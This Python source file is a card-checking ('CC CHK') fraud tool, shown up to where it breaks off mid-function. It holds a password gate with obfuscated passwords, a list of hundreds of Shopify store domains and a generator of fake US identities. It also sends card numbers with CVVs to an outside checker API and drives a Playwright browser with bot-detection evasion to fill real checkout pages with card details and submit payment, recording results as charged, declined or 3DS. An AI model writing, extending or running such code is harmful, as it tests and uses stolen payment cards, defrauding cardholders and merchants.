import os, re, sys, json, time, base64, hashlib, getpass, random, asyncio, threading, itertools, subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

for _pkg in ("requests", "colorama", "cfonts"):
    try:
        __import__(_pkg)
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", _pkg], check=False)

import requests
from colorama import Fore, Style, init
from cfonts import render

init(autoreset=True)

WHITE   = Fore.LIGHTWHITE_EX + Style.BRIGHT
CYAN    = Fore.LIGHTCYAN_EX + Style.BRIGHT
RED     = Fore.LIGHTRED_EX + Style.BRIGHT
GREEN   = Fore.LIGHTGREEN_EX + Style.BRIGHT
YELLOW  = Fore.LIGHTYELLOW_EX + Style.BRIGHT
MAGENTA = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
DIM     = Style.DIM
R       = Style.RESET_ALL

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(SCRIPT_DIR, "config.json")
STORE_CACHE = os.path.join(SCRIPT_DIR, "shopify_stores.json")

CC_API = "https://uncoder.eu.org/cc-checker/api.php"
CC_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://uncoder.eu.org",
    "Referer": "https://uncoder.eu.org/cc-checker/",
    "X-Requested-With": "XMLHttpRequest",
}
BIN_API = "https://lookup.binlist.net/"
BIN_HEADERS = {"Accept-Version": "3", "User-Agent": "Mozilla/5.0 (Linux; Android 15)"}

CC_RE = re.compile(r"^\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
TAG_RE = re.compile(r"<[^>]+>")
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
STATUS_COLOR = {
    "live": GREEN, "dead": RED, "error": YELLOW, "unknown": YELLOW,
    "charged": GREEN, "approved": GREEN, "declined": RED,
    "3ds": MAGENTA, "captcha": YELLOW, "blocked": YELLOW,
}
BOX_W = 64

# =========================================================
#  500+ SHOPIFY DOMAINS (from BeaverCheck, Adyntel, TechLeads, Shopify blog)
# =========================================================
SHOPIFY_DOMAINS = """
gymshark.com, allbirds.com, fashionnova.com, kyliecosmetics.com, tatcha.com,
glossier.com, fentybeauty.com, drunkelephant.com, supergoop.com, youthtothepeople.com,
paulaschoice.com, thenimetyou.com, bombas.com, rothys.com, thirdlove.com,
frankiesbikinis.com, cutsclothing.com, mackweldon.com, vuori.com, outdoorvoices.com,
trueclassictees.com, chubbiesshorts.com, buckmason.com, oatly.com, huel.com,
vervecoffee.com, blkandbold.com, flybyjing.com, tazachocolate.com, goodfair.com,
thebeautychef.com, presshealthfoods.com, wildzora.com, graza.co, bigblanket.com,
goodeeworld.com, packagefreeshop.com, pelacase.com, loopearplugs.com, chillys.com,
bruvi.com, silkandwillow.com, lunchskins.com, ozonesocks.com, analuisa.com,
danielwellington.com, mvmt.com, vincero.com, bremont.com, troubadourgoods.com,
cocofloss.com, givemetap.com, leotardboutique.com, velasca.com, anker.com,
nomadgoods.com, peakdesign.com, shopmoment.com, bellroy.com, waterfield.com,
satechi.net, nativeunion.com, lovevery.com, lowlandkids.com, healthyrootsdolls.com,
lootcrate.com, potgang.co.uk, patagonia.com, whoop.com, ridge.com, ouraring.com,
skims.com, warbyparker.com, yellowbird.com, zitsticka.com, ritual.com, seed.com,
sakara.com, tiege.com, vessi.com, wellbel.com, purelyelizabeth.com, drbronner.com,
eight-sleep.com, mudwtr.com, carawayhome.com, brooklinen.com, parachutehome.com,
ruggable.com, snowehome.com, ring.com, 100thieves.com, shopmrbeast.com,
threadless.com, redbull.com, hismile.com, mycarpe.com, juniperandivy.com,
hellotushy.com, cocokind.com, kinship.com, ursamajorvt.com, truebotanicals.com,
biossance.com, herbivorebotanicals.com, mejuri.com, missoma.com, au-rate.com,
mociun.com, catbirdnyc.com, gorjana.com, jenny-bird.com, shoplittlespirits.com,
starlingjewelry.com, alphalete.com, youngla.com, raskol.com, frasershirts.com,
rhone.com, mizzenandmain.com, ministryofsupply.com, kidbox.com, primary.com,
hannaandersson.com, miniware.com, biomel.com, care-of.com, thorne.com, ag1.com,
lmnt.com, drinklmnt.com, waterboy.com, curehydration.com, tenthousand.cc,
nobullproject.com, vivobarefoot.com, merrell.com, hoka.com, fleetfeet.com,
roadrunnersports.com, jackrabbit.com, runningwarehouse.com, holabirdsports.com,
troubadourgoods.com, thehoneypot.co, beautybakerie.com, cheekbonebeauty.com,
meowmeowtweet.com, beneathyourmask.com, lastobject.com, econea.com, flourist.com,
brooklinen.com, hiutdenim.co.uk, allbirds.eu, bodybuilding.com, grind.co.uk,
rayconglobal.com, puravidabracelets.com, mattel.com, wyzecam.com, condorcycles.com,
pipsnacks.com, netflix.shop, stevemadden.com, fentybeauty.com, on.com, ecoflow.com,
voomisupply.com, goodbuygear.com, humehealth.com, wearfigs.com, slumberland.com,
jackery.com, cupshe.com, dreametech.com, ugreen.com, bugmd.com, carparts.com,
restaurantware.com, aloyoga.com, eufy.com, velotricbike.com, jenis.com, wecreat.com,
xtool.com, nrsworld.com, thornebros.com, shokz.com, tartecosmetics.com, ftd.com,
speediance.com, laserpecker.net, ooni.com, wybotpool.com, glossgenius.com,
bagsmart.com, nobltravel.com, jwpei.com, orthofeet.com, segway.com,
ryzesuperfoods.com, tymobeauty.com, gaia.com, thewoobles.com, stanley1913.com,
vicegolf.com, clarifion.com, sheffield-pottery.com, uspoloassn.com, lasfit.com,
appalachianoutfitters.com, rallysportdirect.com, babylist.com, eyekeeper.com,
onepeloton.com, thehalara.com, garvee.com, x-sense.com, proudpatriots.com,
beatbot.com, kickscrew.com, ourlandoutdoor.com, flourishpresets.com, jovs.com,
altfragrances.com, slashop.com, rugsusa.com, ritfitsports.com, bonescoffee.com,
jackboxgames.com, dermstreet.com, firefold.com, getyourwaggleon.com,
ruggable.com.au, lovetodream.com, novaalab.com, hulalahome.com, goodevas.com,
patriotdepot.com, tmgindustrial.com, trybello.com, seattlecoffeegear.com,
spotlightoralcare.com, frejanyc.com, cosmotogether.com, eu.bauer.com,
montessorigeneration.com, poshpeanut.com, eriksbikeshop.com, langehair.com,
solacebands.com, vaerwatches.com, sundays-company.com, guesswatches.com, pura.com,
auxbeam.com, design-edc.com, edusensetoys.com, autos-suggestions.ca, dirniashop.com,
cloudhamptonvape.com, blbijou.com, elkhartrvparts.com, apexpack.co.nz, afilm.me,
densifil.com, apollomvmt.com, ecosoyabrands.com, gametraderzero.com, minbie.co.uk,
universefrequencies.store, valmeris.com, successhuntersprints.com,
demovehicles.rivian.com, dfyne.com, uk.ooni.com, saffnco.com, shop.becleverman.com,
mokinglobal.com, toyworldinc.co, unifydrive.com, mroace.com, ketodirect.com.au,
iamgia.com, primalpastures.com, cirklestreet.com, charmingintimates.com,
thebronxclothingcompany.com, konainfashion.com, glowzii.com, clickenshop.com,
methodk9shop.com, mynumy.com, vidawheel.com, shop.geektherapeutics.com, eu.hookii.com,
soneesports.com, store.shopqwlc.com, 1cor311publishing.com, choralmusicpublishing.co.uk,
www.sawtellepublishing.com, www.pkdpublishing.com, birdcitycomics.com,
appliancespares.com.au, creativecrochetstore.co.uk, spellboundsistersbookstore.com,
zillymonkey.com, gatheringgames.co.uk, shop.cenex.com, eternacards.co.uk,
www.brooklynhaberdashery.com, naturespeaksprints.com, rungoodlife.com,
www.cardcaverntradingcards.com, primeprotector.at, joshscards.com, gbtoys.com.au,
postcardstore.in, store.sho.com, deathwishcoffee.com, resilia.shop, smooche.com,
helloklean.com, blenderseyewear.com, c9champion.shopping, dagne-dover.shopping,
dagnedover.shopping, fieldluft.de, cozyearth.com, schutz-shoes.com,
miloustyle.myshopify.com, dubgum.com
"""
SHOPIFY_DOMAINS = [d.strip() for d in SHOPIFY_DOMAINS.replace("\n", " ").split(",")
                   if d.strip()]

# =========================================================
#  AUTH
# =========================================================
_PW_B64 = ["c2Fla2E=", "c2Fla2FjdXRpZQ==", "Y2hr", "c2Fla2FjaGVja2Vy"]
def _hash(s): return hashlib.sha256(s.encode("utf-8")).hexdigest()
_VALID_HASHES = {_hash(base64.b64decode(b).decode("utf-8")) for b in _PW_B64}

def auth_gate():
    banner()
    print(CYAN + "  ┌─ authentication " + "─" * 42 + "┐" + R)
    for attempt in range(1, 4):
        try:
            pw = getpass.getpass(f"  {YELLOW}password [{attempt}/3] ▸ {R}")
        except Exception:
            pw = input(f"  {YELLOW}password [{attempt}/3] ▸ {R}")
        if _hash(pw) in _VALID_HASHES:
            print("  " + GREEN + "✓ access granted" + R)
            time.sleep(0.5)
            return True
        print("  " + RED + f"✗ wrong password ({attempt}/3)" + R)
        time.sleep(0.6)
    print("  " + RED + "too many attempts — exiting" + R)
    return False

# =========================================================
#  TERMINAL
# =========================================================
def clear(): os.system("cls" if os.name == "nt" else "clear")

def type_out(text, delay=0.008, color=""):
    for ch in text:
        sys.stdout.write(color + ch + R); sys.stdout.flush(); time.sleep(delay)
    print()

_status_len = [0]
def status_line(text):
    pad = max(0, _status_len[0] - len(ANSI_RE.sub("", text)))
    sys.stdout.write("\r" + text + (" " * pad)); sys.stdout.flush()
    _status_len[0] = len(ANSI_RE.sub("", text))

def clear_status():
    if _status_len[0]:
        sys.stdout.write("\r" + " " * _status_len[0] + "\r"); sys.stdout.flush()
        _status_len[0] = 0

def hide_cursor(): sys.stdout.write("\x1b[?25l"); sys.stdout.flush()
def show_cursor(): sys.stdout.write("\x1b[?25h"); sys.stdout.flush()

class Spinner:
    FRAMES = ["◜", "◠", "◝", "◞", "◡", "◟"]
    def __init__(self, label="working"):
        self.label = label; self._stop = threading.Event(); self._t = None
    def _spin(self):
        i = 0
        while not self._stop.is_set():
            f = self.FRAMES[i % len(self.FRAMES)]
            sys.stdout.write(f"\r  {CYAN}{f}{R}  {WHITE}{self.label}{R}  ")
            sys.stdout.flush(); time.sleep(0.1); i += 1
    def __enter__(self):
        hide_cursor(); self._t = threading.Thread(target=self._spin, daemon=True)
        self._t.start(); return self
    def __exit__(self, *a):
        self._stop.set()
        if self._t: self._t.join()
        show_cursor(); sys.stdout.write("\r" + " " * 72 + "\r"); sys.stdout.flush()

def progress_bar(done, total, width=32, color=GREEN):
    pct = done / total if total else 0
    filled = int(width * pct)
    bar = "█" * filled + DIM + "░" * (width - filled) + R
    return f"{color}{bar}{R}  {WHITE}{done:>4}/{total:<4}{R}  {YELLOW}{pct*100:5.1f}%{R}"

def boxed(lines, width=BOX_W, color=CYAN):
    print(color + "╭" + "─" * (width - 2) + "╮")
    for ln in lines:
        vis = len(ANSI_RE.sub("", ln)); pad = max(0, width - 4 - vis)
        print(color + "│" + " " + ln + " " * pad + color + "│")
    print(color + "╰" + "─" * (width - 2) + "╯")

def banner():
    clear()
    try: art = render("CC CHK", font="tiny", colors=["candy"], align="left")
    except Exception: art = "CC CHK\n"
    w = BOX_W
    print(CYAN + "═" * w); print(art, end=""); print(CYAN + "═" * w)
    print(WHITE + "kramyer  |  Raiii Kramyer")
    print(DIM + "api · shopify-browser · auto-address · proxy")
    print(CYAN + "═" * w); print()

# =========================================================
#  AUTO ADDRESS
# =========================================================
_US_ADDR = {
    "cities": [
        ("New York", "NY", "10001", "212"), ("Los Angeles", "CA", "90001", "213"),
        ("Chicago", "IL", "60601", "312"), ("Houston", "TX", "77001", "713"),
        ("Phoenix", "AZ", "85001", "602"), ("Philadelphia", "PA", "19101", "215"),
        ("San Antonio", "TX", "78201", "210"), ("San Diego", "CA", "92101", "619"),
        ("Dallas", "TX", "75201", "214"), ("San Jose", "CA", "95101", "408"),
        ("Austin", "TX", "78701", "512"), ("Jacksonville", "FL", "32099", "904"),
        ("San Francisco", "CA", "94101", "415"), ("Columbus", "OH", "43085", "614"),
        ("Charlotte", "NC", "28201", "704"), ("Indianapolis", "IN", "46201", "317"),
        ("Seattle", "WA", "98101", "206"), ("Denver", "CO", "80201", "303"),
        ("Boston", "MA", "02101", "617"), ("Nashville", "TN", "37201", "615"),
        ("Portland", "OR", "97201", "503"), ("Las Vegas", "NV", "89101", "702"),
        ("Atlanta", "GA", "30301", "404"), ("Miami", "FL", "33101", "305"),
    ],
    "streets": ["Main St", "Oak Ave", "Maple Dr", "Pine St", "Elm St",
                "Washington Ave", "Lake View Rd", "Park Blvd", "Cedar Ln",
                "Sunset Dr", "Riverside Dr", "Highland Ave", "Spring St",
                "Hillcrest Rd", "Broadway", "Madison Ave", "Jefferson St",
                "Lincoln Ave", "Franklin St", "Roosevelt Blvd"],
    "first_names": ["James", "John", "Robert", "Michael", "William", "David",
                    "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia",
                    "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica",
                    "Sarah", "Karen", "Emily", "Ashley", "Daniel", "Matthew"],
    "last_names": ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
                   "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez",
                   "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore",
                   "Jackson", "Martin", "Lee", "Perez", "Thompson", "White"],
}

def generate_address():
    city, state, base_zip, area = random.choice(_US_ADDR["cities"])
    street_num = random.randint(100, 9999)
    street = random.choice(_US_ADDR["streets"])
    zip_code = base_zip[:-2] + f"{random.randint(0, 99):02d}"
    first = random.choice(_US_ADDR["first_names"])
    last = random.choice(_US_ADDR["last_names"])
    phone = f"+1{area}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 999)}@{random.choice(['gmail.com','yahoo.com','outlook.com','icloud.com'])}"
    return {"first_name": first, "last_name": last,
            "address1": f"{street_num} {street}",
            "address2": random.choice(["", "", "", "Apt " + str(random.randint(1, 999)),
                                        "Unit " + str(random.randint(1, 99))]),
            "city": city, "province_code": state, "country_code": "US",
            "zip": zip_code, "phone": phone, "email": email}

# =========================================================
#  CONFIG
# =========================================================
DEFAULT_CONFIG = {
    "storage_folder": SCRIPT_DIR, "proxies": [],
    "address": generate_address(), "headless": True, "timeout_ms": 45000,
}

def load_config():
    if not os.path.isfile(CONFIG_PATH):
        save_config(DEFAULT_CONFIG); return dict(DEFAULT_CONFIG)
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f: cfg = json.load(f)
        for k, v in DEFAULT_CONFIG.items(): cfg.setdefault(k, v)
        addr = cfg.setdefault("address", {})
        for k, v in generate_address().items(): addr.setdefault(k, v)
        return cfg
    except Exception: return dict(DEFAULT_CONFIG)

def save_config(cfg):
    try:
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
    except Exception as e: print("  " + RED + f"config save failed: {e}" + R)

CFG = load_config()

def ensure_storage():
    folder = CFG.get("storage_folder") or SCRIPT_DIR
    if not os.path.isdir(folder):
        try: os.makedirs(folder, exist_ok=True)
        except Exception:
            folder = SCRIPT_DIR; CFG["storage_folder"] = folder; save_config(CFG)
    return folder

# =========================================================
#  PATH + FILE PICKER
# =========================================================
def resolve_user_path(raw):
    raw = raw.strip().strip('"').strip("'")
    if not raw: return None
    if raw.startswith("~"): return os.path.expanduser(raw)
    for prefix in ("storage/emulated/0/", "/storage/emulated/0/"):
        if raw.startswith(prefix):
            return os.path.expanduser("~/storage/shared/" + raw[len(prefix):])
    return raw if os.path.isabs(raw) else os.path.abspath(raw)

def _default_start_dir():
    for c in [os.path.expanduser("~/storage/shared"), os.path.expanduser("~/storage/downloads"),
              os.path.expanduser("~/storage"), os.path.expanduser("~"), os.getcwd()]:
        if os.path.isdir(c): return c
    return os.getcwd()

def pick_path(ext=None, start_dir=None, want_dir=False):
    cur = start_dir or _default_start_dir()
    while True:
        banner(); print(CYAN + f"  dir  {WHITE}{cur}{R}")
        if want_dir: print(DIM + "  (dir mode — enter selects this folder)" + R)
        print()
        entries = []; parent = os.path.dirname(cur)
        if parent and parent != cur: entries.append(("..", parent, "up"))
        try: names = sorted(os.listdir(cur))
        except Exception: names = []
        for n in names:
            if n.startswith("."): continue
            p = os.path.join(cur, n)
            try:
                if os.path.isdir(p): entries.append((n + "/", p, "dir"))
                elif ext is None or n.lower().endswith(ext.lower()): entries.append((n, p, "file"))
            except Exception: continue
        if not entries: print(DIM + "  (empty)" + R)
        for i, (name, path, kind) in enumerate(entries, 1):
            if kind in ("dir", "up"): print(f"  {WHITE}[{i:>3}]{R}  {CYAN}{name}{R}")
            else: print(f"  {WHITE}[{i:>3}]{R}  {name}")
        print(); hint = "q = cancel"
        if want_dir: hint = "enter = select this folder   ·   " + hint
        print(DIM + f"  {hint}" + R)
        c = input(YELLOW + "  # ▸ " + R).strip()
        if c.lower() == "q": return None
        if c == "" and want_dir: return cur
        try:
            i = int(c) - 1
            if 0 <= i < len(entries):
                _, path, kind = entries[i]
                if kind in ("dir", "up"): cur = path
                else: return path
        except ValueError: pass

def choose_file(ext=".txt", prompt_label="file"):
    banner()
    boxed([f"  {WHITE}select {prompt_label}{R}", f"  {WHITE}[1]{R}  browse",
           f"  {WHITE}[2]{R}  type path", f"  {WHITE}[0]{R}  cancel"])
    mode = input("  " + YELLOW + "▸ " + R).strip()
    if mode in ("0", ""): return None
    if mode == "2":
        raw = input("  " + CYAN + "path ▸ " + R); p = resolve_user_path(raw)
        if p and not os.path.isfile(p) and not os.path.splitext(p)[1]:
            cand = p + ext
            if os.path.isfile(cand): p = cand
        if not p or not os.path.isfile(p):
            print("  " + RED + f"not found: {p or raw}" + R); time.sleep(1.2); return None
        return p
    return pick_path(ext=ext)

def choose_dir(prompt_label="folder"):
    banner()
    boxed([f"  {WHITE}select {prompt_label}{R}", f"  {WHITE}[1]{R}  browse",
           f"  {WHITE}[2]{R}  type path", f"  {WHITE}[0]{R}  cancel"])
    mode = input("  " + YELLOW + "▸ " + R).strip()
    if mode in ("0", ""): return None
    if mode == "2":
        raw = input("  " + CYAN + "path ▸ " + R); p = resolve_user_path(raw)
        if not p: return None
        try: os.makedirs(p, exist_ok=True)
        except Exception as e: print("  " + RED + str(e) + R); time.sleep(1.2); return None
        return p
    return pick_path(want_dir=True)

# =========================================================
#  PROXY POOL
# =========================================================
def normalize_proxy(p):
    p = p.strip()
    if not p: return ""
    if "://" not in p: p = "http://" + p
    return p

def proxy_dict(p): return {"http": p, "https": p} if p else None

class ProxyPool:
    def __init__(self, proxies):
        self._proxies = [normalize_proxy(p) for p in proxies if p.strip()]
        self._lock = threading.Lock()
        self._cycle = itertools.cycle(self._proxies) if self._proxies else None
        self._dead = set()
    def __bool__(self): return bool(self._proxies)
    def __len__(self): return len(self._proxies)
    def next(self):
        if not self._cycle: return None
        with self._lock:
            for _ in range(len(self._proxies)):
                p = next(self._cycle)
                if p not in self._dead: return p
            self._dead.clear()
            return next(self._cycle) if self._cycle else None
    def mark_dead(self, p):
        with self._lock: self._dead.add(p)

def build_pool():
    proxies = CFG.get("proxies") or []
    return ProxyPool(proxies) if proxies else None

# =========================================================
#  BASE CC API + BIN
# =========================================================
def _api_req(cc, proxy):
    try:
        r = requests.post(CC_API, data={"data": cc}, headers=CC_HEADERS,
                          timeout=15, proxies=proxy_dict(proxy))
        if r.status_code != 200: return {"status": "error", "message": f"HTTP {r.status_code}"}, False
        body = r.json()
        return (body, False) if isinstance(body, dict) else ({"status": "error", "message": "bad json"}, False)
    except requests.Timeout: return {"status": "error", "message": "timeout"}, True
    except (requests.ProxyError, requests.ConnectionError) as e: return {"status": "error", "message": str(e)[:60]}, True
    except Exception as e: return {"status": "error", "message": str(e)[:80]}, False

def api_check(cc, pool=None, retries=2):
    last = {"status": "error", "message": "no attempt"}
    for i in range(retries + 1):
        proxy = pool.next() if pool else None
        res, dead = _api_req(cc, proxy); last = res
        if dead and pool and proxy: pool.mark_dead(proxy)
        if res.get("status") != "error": return res
        if i < retries: time.sleep(1.0 * (i + 1))
    return last

_BIN_CACHE = {}; _BIN_LOCK = threading.Lock()
def flag_emoji(alpha2):
    if not alpha2 or len(alpha2) != 2: return ""
    return "".join(chr(0x1F1E6 + ord(c.upper()) - ord("A")) for c in alpha2)

def lookup_bin(bin_number, pool=None):
    with _BIN_LOCK:
        if bin_number in _BIN_CACHE: return _BIN_CACHE[bin_number]
    result = {}; proxy = pool.next() if pool else None
    try:
        r = requests.get(BIN_API + bin_number, headers=BIN_HEADERS, timeout=10, proxies=proxy_dict(proxy))
        if r.status_code == 200:
            d = r.json() or {}; c = d.get("country") or {}; b = d.get("bank") or {}
            a2 = (c.get("alpha2") or "").upper()
            result = {"scheme": (d.get("scheme") or "").capitalize(), "type": (d.get("type") or "").capitalize(),
                      "prepaid": bool(d.get("prepaid")), "bank": b.get("name") or "",
                      "country": c.get("name") or "", "country_code": a2,
                      "country_emoji": c.get("emoji") or flag_emoji(a2)}
        elif r.status_code == 429: result = {"error": "rate-limited"}
        elif r.status_code == 404: result = {"error": "bin-not-found"}
        else: result = {"error": f"http-{r.status_code}"}
    except Exception as e: result = {"error": str(e)[:60]}
    with _BIN_LOCK: _BIN_CACHE[bin_number] = result
    return result

def extract_bin(cc): return cc.split("|")[0][:6]

# =========================================================
#  SHOPIFY VARIANT + CART
# =========================================================
_VARIANT_CACHE = {}; _VARIANT_LOCK = threading.Lock()

def fetch_variant(domain, pool=None):
    with _VARIANT_LOCK:
        if domain in _VARIANT_CACHE: return _VARIANT_CACHE[domain]
    proxy = pool.next() if pool else None; result = None
    try:
        r = requests.get(f"https://{domain}/products.json?limit=50",
                         headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"},
                         timeout=15, proxies=proxy_dict(proxy))
        if r.status_code == 429: result = {"error": "429"}
        elif r.status_code == 404: result = {"error": "404"}
        elif r.status_code != 200: result = {"error": f"http {r.status_code}"}
        else:
            products = r.json().get("products") or []
            if not products: result = {"error": "no products"}
            else:
                variants = []
                for p in random.sample(products, min(10, len(products))):
                    for v in p.get("variants", []):
                        if v.get("available"):
                            variants.append({"title": p.get("title", "")[:60], "variant_id": v["id"], "price": v.get("price", "0")}); break
                result = {"variants": variants} if variants else {"error": "no available"}
    except requests.Timeout: result = {"error": "timeout"}
    except Exception as e: result = {"error": str(e)[:60]}
    with _VARIANT_LOCK:
        if "variants" in result: _VARIANT_CACHE[domain] = result
    return result

def build_checkout_url(domain, variant_id):
    return f"https://{domain}/cart/{variant_id}:1?skip_shop_pay=true&auto_redirect=false"

# =========================================================
#  PLAYWRIGHT DRIVER
# =========================================================
def _run_async(coro):
    loop = asyncio.new_event_loop()
    try: return loop.run_until_complete(coro)
    finally: loop.close()

async def _playwright_checkout(checkout_url, cc, address, proxy_url=None, headless=True, timeout_ms=45000):
    from playwright.async_api import async_playwright
    parts = cc.split("|"); num, mm, yy, cvv = parts
    if len(yy) == 2: yy = "20" + yy
    mm_short = mm.zfill(2); yy_short = yy[-2:]
    result = {"status": "error", "message": "unknown", "url": checkout_url}
    async with async_playwright() as pw:
        launch_args = ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
                       "--disable-blink-features=AutomationControlled",
                       "--disable-features=IsolateOrigins,site-per-process"]
        launch_kwargs = {"headless": headless, "args": launch_args}
        if CHROMIUM_PATH: launch_kwargs["executable_path"] = CHROMIUM_PATH
        browser = await pw.chromium.launch(**launch_kwargs)
        ctx_kwargs = {"user_agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                      "viewport": {"width": 412, "height": 915}, "device_scale_factor": 2.625,
                      "is_mobile": True, "has_touch": True, "locale": "en-US", "timezone_id": "America/New_York"}
        if proxy_url:
            from urllib.parse import urlparse
            pp = urlparse(proxy_url); proxy_cfg = {"server": f"{pp.scheme}://{pp.hostname}:{pp.port}"}
            if pp.username: proxy_cfg["username"] = pp.username; proxy_cfg["password"] = pp.password
            ctx_kwargs["proxy"] = proxy_cfg
        context = await browser.new_context(**ctx_kwargs); page = await context.new_page()
        await page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US','en'] });
            Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
        """)
        try:
            await page.goto(checkout_url, wait_until="domcontentloaded", timeout=timeout_ms)
            await page.wait_for_timeout(3500)
            body_text = (await page.content()).lower()
            if "captcha" in body_text or "hcaptcha" in body_text or "recaptcha" in body_text:
                result = {"status": "captcha", "message": "captcha on checkout", "url": checkout_url}
                await browser.close(); return result
            for sel in ['input[type="email"]', 'input[name="email"]', 'input[autocomplete="email"]']:
                try:
                    el = page.locator(sel).first
                    if await el.count() > 0 and await el.is_visible(): await el.fill(address["email"]); break
                except Exception: continue
            field_map = [
                (["input[name='firstName']", "input[autocomplete='given-name']", "input[id*='firstName']"], address["first_name"]),
                (["input[name='lastName']", "input[autocomplete='family-name']", "input[id*='lastName']"], address["last_name"]),
                (["input[name='address1']", "input[autocomplete='address-line1']", "input[id*='address1']"], address["address1"]),
                (["input[name='address2']", "input[autocomplete='address-line2']", "input[id*='address2']"], address["address2"]),
                (["input[name='city']", "input[autocomplete='address-level2']", "input[id*='city']"], address["city"]),
                (["input[name='postalCode']", "input[autocomplete='postal-code']", "input[id*='postalCode']", "input[id*='zip']"], address["zip"]),
                (["input[name='phone']", "input[autocomplete='tel']", "input[id*='phone']"], address["phone"]),
            ]
            for sels, val in field_map:
                if not val: continue
                for sel in sels:
                    try:
                        el = page.locator(sel).first
                        if await el.count() > 0 and await el.is_visible(): await el.fill(str(val)); await page.wait_for_timeout(120); break
                    except Exception: continue
            try:
                prov = page.locator("select[name='province']").first
                if await prov.count() > 0: await prov.select_option(value=address["province_code"]); await page.wait_for_timeout(400)
            except Exception: pass
            try:
                country = page.locator("select[name='countryCode']").first
                if await country.count() > 0: await country.select_option(value=address["country_code"]); await page.wait_for_timeout(400)
            except Exception: pass
            card_filled = False
            for frame_sel in ['iframe[title="Payment"]', 'iframe[title="Secure payment"]',
                              'iframe.card-fields-iframe', 'iframe[src*="card-fields"]', 'iframe[id^="card-fields"]']:
                try:
                    frame = page.frame_locator(frame_sel)
                    if await frame.locator("input").count() == 0: continue
                    for label, value in [("Card number", f"{num}"), ("Expiration date", f"{mm_short}/{yy_short}"),
                                          ("Security code", cvv), ("Name on card", f"{address['first_name']} {address['last_name']}")]:
                        try: await frame.get_by_label(label).fill(value, timeout=3000)
                        except Exception: pass
                    for sel, value in [("input[name='number']", num), ("input[name='expiry']", f"{mm_short}/{yy_short}"),
                                        ("input[name='verification_value']", cvv), ("input[name='name']", f"{address['first_name']} {address['last_name']}")]:
                        try:
                            el = frame.locator(sel).first
                            if await el.count() > 0: await el.fill(value, timeout=2000)
                        except Exception: pass
                    card_filled = True; break
                except Exception: continue
            if not card_filled:
                result = {"status": "error", "message": "card iframe not found", "url": checkout_url}
                await browser.close(); return result
            await page.wait_for_timeout(800)
            submitted = False
            for sel in ['button[id="checkout-pay-button"]', 'button[type="submit"]',
                        'button:has-text("Pay now")', 'button:has-text("Complete order")', 'button:has-text("Pay")']:
                try:
                    btn = page.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible(): await btn.click(); submitted = True; break
                except Exception: continue
            if not submitted:
                result = {"status": "error", "message": "submit not found", "url": checkout_url}
                await browser.close(); return result
            await page.wait_for_timeout(6000)
            final_url = page.url; content = (await page.content()).lower()
            if "3d" in final_url.lower() or "challenge" in final_url.lower():
                result = {"status": "3ds", "message": "3DS challenge", "url": final_url}
            elif "/thank_you" in final_url or "thank_you" in content or "order confirmed" in content or "order#" in content:
                result = {"status": "charged", "message": "order placed", "url": final_url}
            elif "card was declined" in content or "declined" in content:
                result = {"status": "declined", "message": "card declined", "url": final_url}
            elif "insufficient" in content:
                result = {"status": "declined", "message": "insufficient funds", "url": final_url}
            elif "expired" in content:
                result = {"status": "declined", "message": "card expired", "url": final_url}
            elif "captcha" in content:
                result = {"status": "captcha", "message": "captcha mid-flow", "url": final_url}
            elif "processing" in content or "please wait" in content:
                result = {"status": "unknown", "message": "processing", "url": final_url}
            else:
                err_text = ""
                try:
                    err_el = page.locator("[role='alert'], .error, [class*='error']").first
                    if await err_el.count() > 0: err_text = (await err_el.inner_text())[:120]
                except Exception: pass
                result = {"status": "unknown", "message": err_text or "no clear result", "url": final_url}
        except Exception as e:
            result = {"status": "error", "message": str(e)[:120], "url": checkout_url}
        finally:
            try: await browser.close()
            except Exception: pass
    return result

def playwright_checkout(checkout_url, cc, address, proxy_url=None):
    headless = CFG.get("headless", True); timeout_ms = CFG.get("timeout_ms", 45000)
    try: return _run_async(_playwright_checkout(checkout_url, cc, address, proxy_url, headless, timeout_ms))
    except Exception as e: return {"status": "error", "message": str(e)[:120], "url": checkout_url}

def browser_checkout(domain, cc, address, pool=None):
    engine = detect_browser_engine()
    info = fetch_variant(domain, pool=pool)
    if "error" in info: return {"status": "error", "message": f"variant: {info['error']}", "url": ""}
    variant = random.choice(info["variants"]); url = build_checkout_url(domain, variant["variant_id"])
    proxy_url = None
    if pool and len(pool):
        p = pool.next()
        if p: proxy_url = p
    if engine == "playwright": res = playwright_checkout(url, cc, address, proxy_url=proxy_url)
    else: return {"status": "error", "message": "browser engine not installed", "url": url}
    res.setdefault("product", variant["title"]); res.setdefault("price", variant["price"])
    return res

# =========================================================
#  STORE VALIDATOR
# =========================================================
def _probe_store(domain, pool):
    result = {"domain": domain, "shopify": False, "categories": [], "error": None}
    try:
